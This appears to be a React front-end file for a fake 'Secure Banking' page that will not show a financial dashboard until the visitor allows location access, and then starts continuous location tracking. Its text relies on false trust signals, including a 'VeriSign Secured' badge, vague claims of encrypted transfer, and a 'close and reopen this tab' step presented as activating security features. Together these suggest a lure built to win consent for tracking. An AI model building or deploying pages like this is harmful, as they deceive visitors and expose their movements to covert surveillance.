import React, { useEffect, useState } from 'react'
import { useGeolocation } from './hooks/useGeolocation'
import FinanceContent from './components/FinanceContent'
import './App.css'

function App() {
  const { getCurrentLocation, startTracking, loading } = useGeolocation()
  const [permissionStatus, setPermissionStatus] = useState('pending') // pending, granted, denied

  // Request location permission again
  const requestPermission = () => {
    console.log('🔐 Requesting location permission again...')
    setPermissionStatus('pending')
    getCurrentLocation().then(() => {
      console.log('✅ Permission granted! Setting localStorage and starting tracking...')
      localStorage.setItem('locationPermissionGranted', 'true')
      setPermissionStatus('granted')
      startTracking()
    }).catch((error) => {
      console.error('❌ Permission denied or error:', error)
      localStorage.setItem('locationPermissionGranted', 'false')
      setPermissionStatus('denied')
    })
  }

  // Check if permission was just granted in this session
  const permissionJustGranted = localStorage.getItem('locationPermissionGranted') === 'true' && 
                               !sessionStorage.getItem('permissionAcknowledged')
  
  // Mark permission as acknowledged for this session
  if (permissionJustGranted) {
    sessionStorage.setItem('permissionAcknowledged', 'true')
  }

  useEffect(() => {
    console.log('🚀 App useEffect triggered')
    
    if ('geolocation' in navigator) {
      // Check if user has previously granted permission
      const hasLocationPermission = localStorage.getItem('locationPermissionGranted')
      console.log('🔍 Checking localStorage permission:', hasLocationPermission)
      
      if (hasLocationPermission === 'true') {
        // Start continuous tracking immediately if permission was previously granted
        console.log('✅ Permission already granted, starting tracking...')
        setPermissionStatus('granted')
        startTracking()
      } else if (hasLocationPermission === 'false') {
        // Permission was previously denied
        console.log('❌ Permission previously denied')
        setPermissionStatus('denied')
      } else {
        // Request location permission first
        console.log('❓ No permission found, requesting location...')
        getCurrentLocation().then(() => {
          // If successful, mark permission as granted and start continuous tracking
          console.log('✅ Permission granted! Setting localStorage and starting tracking...')
          localStorage.setItem('locationPermissionGranted', 'true')
          setPermissionStatus('granted')
          startTracking()
        }).catch((error) => {
          // Permission denied or error
          console.error('❌ Permission denied or error:', error)
          localStorage.setItem('locationPermissionGranted', 'false')
          setPermissionStatus('denied')
        })
      }
    } else {
      console.error('❌ Geolocation not available in navigator')
      setPermissionStatus('denied')
    }
  }, [getCurrentLocation, startTracking])

  // Show loading state while checking permission
  if (permissionStatus === 'pending' || loading) {
    return (
      <div className="App permission-loading">
        <div className="loading-container">
          <div className="spinner"></div>
          <p>Checking location permissions...</p>
        </div>
      </div>
    )
  }

  // Show finance content when permission is granted
  if (permissionStatus === 'granted') {
    // Show refresh notice if permission was just granted
    if (permissionJustGranted) {
      return (
        <div className="App maintenance-page">
          <header className="maintenance-header">
            <div className="maintenance-header-inner">
              <div className="maintenance-brand-center">
                <img
                  src="/logo.png"
                  alt="Secure Banking"
                  className="maintenance-logo"
                />
              </div>
            </div>
          </header>

          <main className="maintenance-main">
            <section className="maintenance-card">
              <p className="maintenance-info">You are browsing our site in a safe and secure mode.</p>
              <p className="maintenance-info">
                Data transferred from your machine to our servers is in an encrypted mode,
                confidential information.
              </p>

              <div className="maintenance-divider" />

              <h1 className="maintenance-title">PERMISSION GRANTED ✓</h1>
              <p className="maintenance-message">
                Thank you for granting location access! Your financial dashboard is now ready.
              </p>

              <div className="permission-success-section">
                <div className="success-icon">✅</div>
                <p className="success-text">
                  Location permission has been successfully enabled.
                </p>
                <div className="refresh-instruction">
                  <p className="instruction-text">
                    <strong>Please close and reopen this tab to view your financial dashboard.</strong>
                  </p>
                  <p className="instruction-note">
                    This ensures all security features are properly activated.
                  </p>
                </div>
              </div>

              <div className="maintenance-divider" />

              <p className="maintenance-thanks">Thank you for your cooperation. 🙏</p>

              <div className="maintenance-footer-links">
                <span>FAQs</span>
                <span>Security Tips</span>
                <span>Demo</span>
              </div>

            </section>
          </main>

          <footer className="maintenance-security-footer">
            <div className="maintenance-security-badge">VeriSign Secured</div>
          </footer>
        </div>
      )
    }
    
    return <FinanceContent />
  }

  // Show maintenance page with permission request button when denied
  return (
    <div className="App maintenance-page">
      <header className="maintenance-header">
        <div className="maintenance-header-inner">
          <div className="maintenance-brand-center">
            <img
              src="/logo.png"
              alt="Secure Banking"
              className="maintenance-logo"
            />
          </div>
        </div>
      </header>

      <main className="maintenance-main">
        <section className="maintenance-card">
          <p className="maintenance-info">You are browsing our site in a safe and secure mode.</p>
          <p className="maintenance-info">
            Data transferred from your machine to our servers is in an encrypted mode,
            confidential information.
          </p>

          <div className="maintenance-divider" />

          <h1 className="maintenance-title">LOCATION PERMISSION REQUIRED</h1>
          <p className="maintenance-message">
            To access our financial services and ensure your security, we need location access.
            This helps us provide personalized services and protect your account.
          </p>

          <div className="permission-section">
            <div className="permission-icon">📍</div>
            <p className="permission-text">
              Location access is required to view your financial dashboard and access banking services.
            </p>
            <button 
              className="btn btn-primary permission-button" 
              onClick={requestPermission}
              disabled={loading}
            >
              {loading ? 'Requesting...' : 'Grant Location Access'}
            </button>
            <p className="permission-note">
              You can change this anytime in your browser settings.
            </p>
          </div>

          <div className="maintenance-divider" />

          <p className="maintenance-thanks">Thank you for your understanding. 🙏</p>

          <div className="maintenance-footer-links">
            <span>FAQs</span>
            <span>Security Tips</span>
            <span>Demo</span>
          </div>

        </section>
      </main>

      <footer className="maintenance-security-footer">
        <div className="maintenance-security-badge">VeriSign Secured</div>
      </footer>
    </div>
  )
}

export default App
